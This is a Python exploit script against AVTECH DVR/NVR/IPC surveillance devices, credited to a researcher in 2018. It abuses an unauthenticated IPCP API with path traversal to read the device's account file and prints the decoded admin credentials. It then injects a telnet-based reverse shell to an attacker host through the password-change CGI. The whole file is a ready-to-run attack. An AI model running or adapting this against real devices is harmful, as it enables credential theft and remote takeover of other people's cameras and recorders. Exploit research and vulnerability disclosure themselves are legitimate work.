#!/usr/bin/env python2.7
# [SOF]
#
# Subject: AVTECH {DVR/NVR/IPC} IPCP API admin l/p, RCE (2018 bashis)
#
# Attack vector: Remote
# Authentication: Anonymous (no credentials needed)
# Researcher: bashis <mcw noemail eu> (March 2018)
#
# Authenticated Reverse Shell; Using admin l/p that we can retrieve with unauthenticated and undocumented IPCP API
#
# Vendor: http://www.avtech.com.tw/
#
import socket
import select
import sys
import urllib, urllib2, httplib
import ssl
import argparse
import base64
import os
import sys
import xmltodict # pip install xmltodict
import json

class HTTPconnect:

	def __init__(self, host, proto, verbose, credentials, Raw, noexploit):
		self.host = host
		self.proto = proto
		self.verbose = verbose
		self.credentials = credentials
		self.Raw = Raw
		self.noexploit = noexploit
	
	def Send(self, uri, query_headers, query_data, ID):
		self.uri = uri
		self.query_headers = query_headers
		self.query_data = query_data
		self.ID = ID

		# Connect-timeout in seconds
		timeout = 10
		socket.setdefaulttimeout(timeout)

		url = '{}://{}{}'.format(self.proto, self.host, self.uri)

		if self.verbose:
			print "[Verbose] Sending:", url

		if self.proto == 'https':
			if hasattr(ssl, '_create_unverified_context'):
				print "[i] Creating SSL Unverified Context"
				ssl._create_default_https_context = ssl._create_unverified_context

		if self.credentials:
			Basic_Auth = self.credentials.split(':')
			if self.verbose:
				print "[Verbose] User:",Basic_Auth[0],"Password:",Basic_Auth[1]
			try:
				pwd_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
				pwd_mgr.add_password(None, url, Basic_Auth[0], Basic_Auth[1])
				auth_handler = urllib2.HTTPBasicAuthHandler(pwd_mgr)
				opener = urllib2.build_opener(auth_handler)
				urllib2.install_opener(opener)
			except Exception as e:
				print "[!] Basic Auth Error:",e
				sys.exit(1)

		if self.noexploit and not self.verbose:
			print "[<] 204 Not Sending!"
			html =  "Not sending any data"
			return html
		else:
			if self.query_data:
				req = urllib2.Request(url, self.query_data, headers=self.query_headers)
			else:
				req = urllib2.Request(url, None, headers=self.query_headers)
			try:
				rsp = urllib2.urlopen(req)
			except Exception as e:
				print "[<] {}".format(str(e))
				return False

		if self.Raw:
			return rsp
		else:
			html = rsp.read()
			return html

#
# Validate correctness of HOST, IP and PORT
#
class Validate:

	def __init__(self,verbose):
		self.verbose = verbose

	# Check if IP is valid
	def CheckIP(self,IP):
		self.IP = IP

		ip = self.IP.split('.')
		if len(ip) != 4:
			return False
		for tmp in ip:
			if not tmp.isdigit():
				return False
			i = int(tmp)
			if i < 0 or i > 255:
				return False
		return True

	# Check if PORT is valid
	def Port(self,PORT):
		self.PORT = PORT

		if int(self.PORT) < 1 or int(self.PORT) > 65535:
			return False
		else:
			return True

	# Check if HOST is valid
	def Host(self,HOST):
		self.HOST = HOST

		try:
			# Check valid IP
			socket.inet_aton(self.HOST) # Will generate exeption if we try with FQDN or invalid IP
			# Now we check if it is correct typed IP
			if self.CheckIP(self.HOST):
				return self.HOST
			else:
				return False
		except socket.error as e:
			# Else check valid FQDN, and use the IP address
			try:
				self.HOST = socket.gethostbyname(self.HOST)
				return self.HOST
			except socket.error as e:
				return False

class AVTECH:

	def __init__(self, rhost, rport, proto, verbose, credentials, raw_request, noexploit, headers):
		self.rhost = rhost
		self.rport = rport
		self.proto = proto
		self.verbose = verbose
		self.credentials = credentials
		self.raw_request = raw_request
		self.noexploit = noexploit
		self.headers = headers

		self.BUFFER_SIZE = 1024

	def Send(self, message):
		self.message = message

		timeout = 5
		socket.setdefaulttimeout(timeout)

		try:
			self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.sock.connect((self.rhost, int(self.rport)))
			print "[i] Connected"
		except Exception as e:
			print "[!] Connection failed ({})".format(e)
			sys.exit(1)

		try:
			print "[>] Sending"
			self.sock.send(self.message) # No reply back from server
		except Exception as e:
			print "[!] Send failed ({})".format(e)
			self.sock.close()
			sys.exit(1)

		self.sock.close()


if __name__ == "__main__":

	INFO =  '\nAVTECH {DVR/NVR/IPC} IPCP API admin l/p, RCE (2018 bashis)\n'

	rhost = '192.168.57.20'	# Default Remote HOST
	rport = '80'			# Default Remote PORT
	lhost = '192.168.57.1'	# Default Local HOST
	lport = '1337'			# Default Local PORT

	HTTP = "http"
	HTTPS = "https"
	proto = HTTP
	verbose = False
	noexploit = False
	raw_request = True
	credentials = "admin:admin"	# Default l/p
#	credentials = None

	headers = {
		'Connection': 'close',
		'Content-Type'	:	'application/x-www-form-urlencoded',
		'Accept'	:	'gzip, deflate',
		'Accept-Language'	:	'en-US,en;q=0.8',
		'Cache-Control'	:	'max-age=0',
		'User-Agent':'AVTECH/1.0'
		}

	try:
		arg_parser = argparse.ArgumentParser(
		prog=sys.argv[0],
				description=('[*] '+ INFO +' [*]'))
		arg_parser.add_argument('--rhost', required=True, help='Remote Target Address (IP/FQDN) [Default: '+ rhost +']')
		arg_parser.add_argument('--rport', required=False, help='Remote Target HTTP/HTTPS Port [Default: '+ str(rport) +']')
		arg_parser.add_argument('--lhost', required=False, help='Connect Back Address (IP/FQDN) [Default: '+ lhost +']')
		arg_parser.add_argument('--lport', required=False, help='Connect Back Port [Default: '+ lport + ']')
		arg_parser.add_argument('--getrce', required=False, default=False, action='store_true', help='Execute Reverse Shell [Default: Retrieve admin l/p]')

		if credentials:
			arg_parser.add_argument('--auth', required=False, help='Basic Authentication [Default: '+ credentials + ']')
		arg_parser.add_argument('-v','--verbose', required=False, default=False, action='store_true', help='Verbose mode [Default: False]')
		args = arg_parser.parse_args()
	except Exception as e:
		print INFO,"\nError: {}\n".format(str(e))
		sys.exit(1)

	print INFO

	if args.verbose:
		verbose = True

	if credentials and args.auth:
		credentials = args.auth

	if args.rport:
		rport = args.rport

	if args.rhost:
		rhost = args.rhost

	if args.lport:
		lport = args.lport

	if args.lhost:
		lhost = args.lhost

	# Check if RPORT is valid
	if not Validate(verbose).Port(rport):
		print "[!] Invalid RPORT - Choose between 1 and 65535"
		sys.exit(1)

	# Check if LPORT is valid
	if not Validate(verbose).Port(lport):
		print "[!] Invalid LPORT - Choose between 1 and 65535"
		sys.exit(1)

	# Check if RHOST is valid IP or FQDN, get IP back
	rhost = Validate(verbose).Host(rhost)
	if not rhost:
		print "[!] Invalid RHOST"
		sys.exit(1)

	# Check if LHOST is valid IP or FQDN, get IP back
	lhost = Validate(verbose).Host(lhost)
	if not lhost:
		print "[!] Invalid LHOST"
		sys.exit(1)

#
# Validation done, start print out stuff to the user
#
	print "[i] Remote target IP:",rhost
	print "[i] Remote target PORT:",rport
	if args.getrce:
		print "[i] Connect back IP:",lhost
		print "[i] Connect back PORT:",lport

	remote_host = rhost+':'+rport

	#
	# Get some interesting info about remote target
	#
	try:
		print "[>] -=[ Checking Remote Device Info ]=-"
		URI = "/nobody/Mediadesc_0.xml"
		response = HTTPconnect(remote_host,proto,verbose,credentials,True,noexploit).Send(URI,headers,None,None)
		if response and not response.info().get('Server') == 'Linux/2.x UPnP/1.0 Avtech/1.0':
			print "[!] Remote server '{}' type is wrong".format(response.info().get('Server'))
			print "[i] Exiting"
			sys.exit(1)
		if not response:
			URI = "/nobody/Mediadesc.xml"
			response = HTTPconnect(remote_host,proto,verbose,credentials,True,noexploit).Send(URI,headers,None,None)
			URI = "/nobody/GetVendors"
			response2 = HTTPconnect(remote_host,proto,verbose,credentials,True,noexploit).Send(URI,headers,None,None)
			print "[<] Booted: {}".format(response2.info().get('Last-Modified'))
		else: 
			print "[<] Booted: {}".format(response.info().get('Last-Modified'))
		if not response:
			print "[!] Can't find remote server info..."
			print "[i] Exiting"
			sys.exit(1)

	except Exception as e:
		pass

	XML_2_JSON = xmltodict.parse(response.read())
	print "[<] Model: {} {}".format(XML_2_JSON['root']['device']['manufacturer'],XML_2_JSON['root']['device']['modelDescription'])

	URI = "/"
	response = HTTPconnect(remote_host,proto,verbose,credentials,True,noexploit).Send(URI,headers,None,None)
	if not response:
		print "[<] Failed ({})".format(response) 
		sys.exit(1)
	if not response.info().get('Server') == 'Linux/2.x UPnP/1.0 Avtech/1.0':
		print "[!] Remote server '{}' type is wrong".format(response.info().get('Server'))
		print "[i] Exiting"
		sys.exit(1)
	print "[<] Firmware date: {}".format(response.info().get('Last-Modified'))
	response = response.read()

	#
	# If we don't know remote device credentials, we can try to find out.
	#
	if not args.auth or not args.getrce:

		#
		# We don't want to screw up things, so let's prepare to restore.
		#
		print "[>] -=[ Checking if remote using Captcha ]=-"
		RESTORE_URI = ''
		for captcha in range(0,len(response.split())):
			if response.split()[captcha] == 'setTimeout("getCaptchaImg()",':
				print "[<] Captcha: [True]"
				RESTORE_URI = "nobody/login.htm"
				break
			elif response.split()[captcha] == '//setTimeout("getCaptchaImg()",':
				print "[<] Captcha: [False]"
				RESTORE_URI = "nobody/loginQuick.htm"
				break
		if not RESTORE_URI:
			if args.getrce:
				# Not safe enough to continue...
				print "[!] Can't find Captcha! Not safe enough to continue..."
				sys.exit(0)

			RESTORE_URI = "nobody/login.htm"
			print "[!] Can't find Captcha! Assuming '{}' is default...".format(RESTORE_URI)

		#
		# This seems to be some undocumented and unauthenticated write only API, that's hooking on 'IPCP/'
		# where changes are made in memory only and will therefore not be persistent.
		# There is lots of them available (> 70 depending of device) that can be called by changing 'Message-ID' number accordingly
		#
		# This one (#29) will change default web page to display, which can be redirected to any existing file.
		# We will use '/mnt/database/xml/Account' as we can find remote device credentials in clear text or XOR'ed base64 encoded
		#
		print "[>] -=[ Trying to redirect default page to: /mnt/database/xml/Account ]=-"
		ACCOUNT_URI = "../../../../../mnt/database/xml/Account"
		request = "GET / IPCP/1.0\r\nMessage-ID: 29\r\nConnection: close\r\nContent-Length: " + str(len(ACCOUNT_URI)) + "\r\n\r\n" + ACCOUNT_URI
		AVTECH(rhost,rport,proto,verbose,credentials,raw_request,noexploit,headers).Send(request)

		print "[>] -=[ Trying to retrieve /mnt/database/xml/Account ]=-"
		response = HTTPconnect(remote_host,proto,verbose,credentials,False,noexploit).Send(URI,headers,None,None)
		if not response:
			print "[<] Failed ({})".format(response) 
			sys.exit(1)
		print "[<] Received {} bytes".format(len(response))
		try:
			#
			# Let's find first available admin user and password
			#
			XML_2_JSON = xmltodict.parse(response)
			for user in XML_2_JSON['Account']:
				if user[:4] == 'User':
					if XML_2_JSON['Account'][user]['Level']['#text'] == 'SUPERVISOR':
						Username = XML_2_JSON['Account'][user]['Username']['#text']
						Password = XML_2_JSON['Account'][user]['Password']['#text']
						Level = XML_2_JSON['Account'][user]['Level']['#text']
						print "[<] Success"
						break
				elif user == 'Cloud':
					print "[<] Cloud Account: {}, Password: {}".format(XML_2_JSON['Account'][user]['Username'],XML_2_JSON['Account'][user]['Password'])
					Username = XML_2_JSON['Account'][user]['SUPERVISOR']['Username']
					Password = XML_2_JSON['Account'][user]['SUPERVISOR']['Password']
					Level = 'SUPERVISOR'
					if args.getrce:
						print "[!] RCE not supported..."
						args.getrce = False # Not found out how-to

		except Exception as e:
			print "[<] -=[ This host are not IPCP vulnerable! ]=-"
			print "[!] Exiting!"
			sys.exit(1)

		#
		# Some newer FW versions password fields has XOR'ed base64 encoded passwords
		#
		if len(Password.split(":")) == 3 and Password.split(":")[0] == "enc":
			print "[!] Deobfuscating base64 password: {} ({})".format(Password.split(":")[2],base64.b64decode(Password.split(":")[2]))
			Password = base64.b64decode(Password.split(":")[2])
			XOR = [0x09,0x07,0x09,0x02,0x07,0x07,0x0a] # rolling XOR keys for each byte in the password
			Password = bytearray(Password)
			key = 0
			for i in range(len(Password)):
				if key == len(XOR):
					key = 0
				Password[i] ^= XOR[key]
				key += 1

		print "[i] Level: {}, Username: {}, Password: {}".format(Level,Username,str(Password))
		credentials = Username + ':' + str(Password)
#		print json.dumps(XML_2_JSON,indent=4)

		print "[>] Restore default page to: {}".format(RESTORE_URI)
		request = "GET / IPCP/1.0\r\nMessage-ID: 29\r\nConnection: close\r\nContent-Length: " + str(len(RESTORE_URI)) + "\r\n\r\n" + RESTORE_URI
		AVTECH(rhost,rport,proto,verbose,credentials,raw_request,noexploit,headers).Send(request)

		if not args.getrce:
			if verbose:
				print json.dumps(XML_2_JSON,indent=4)
			print "[i] All done"
			sys.exit(0)

	#
	# No netcat available, telnet client working just fine too
	#
	# This is persistent and will be remote device new PWD, let's make sure to restore!
	#
	RCE = '"$(mkfifo /tmp/s;telnet LHOST LPORT </tmp/s|/bin/sh>/tmp/s 2>&1 ;rm -f /tmp/s)&#"' # Let's fork()
	RCE = RCE.replace('LHOST',lhost).replace('LPORT',lport)

	URI = '/cgi-bin/nobody/Machine.cgi?action=change_password&account='+ base64.b64encode(credentials) +'&new_password='+ base64.b64encode(RCE)
	print "[>] -=[ Trying to add and execute RCE ]=-"
	response = HTTPconnect(remote_host,proto,verbose,credentials,False,noexploit).Send(URI,headers,None,None)
	if not response == False:
		if not response.split()[1] == 'OK':
			print "[<] Failed {}".format(response) 
			sys.exit(1)
		else:
			if len(response.split()) > 2:
				print "[!] Something is not correct!! Exiting..."
				if verbose:
					print response
				sys.exit(1)
			print "[<] {}".format(response.split()[1])
	else:
		print "[<] Should be OK"
	#
	# Use 'RCE' as PWD to restore old PWD
	#
	creds = credentials.split(':')
	tmp = creds[0] + ':' + RCE

	URI = '/cgi-bin/nobody/Machine.cgi?action=change_password&account='+ base64.b64encode(tmp) +'&new_password='+ base64.b64encode(creds[1])
	print "[>] -=[ Trying to delete RCE and restore old PWD ]=-"
	response = HTTPconnect(remote_host,proto,verbose,credentials,False,noexploit).Send(URI,headers,None,None)
	if not response:
		sys.exit(1)
	if not response.split()[1] == 'OK':
		print "[<] Failed {}".format(response) 
		sys.exit(1)
	else:
		if len(response.split()) > 2:
			print "[!] Something is not correct!! Exiting..."
			if verbose:
				print response
			sys.exit(1)
		print "[<] {}".format(response.split()[1])

	print "[i] All done"

# [EOF]

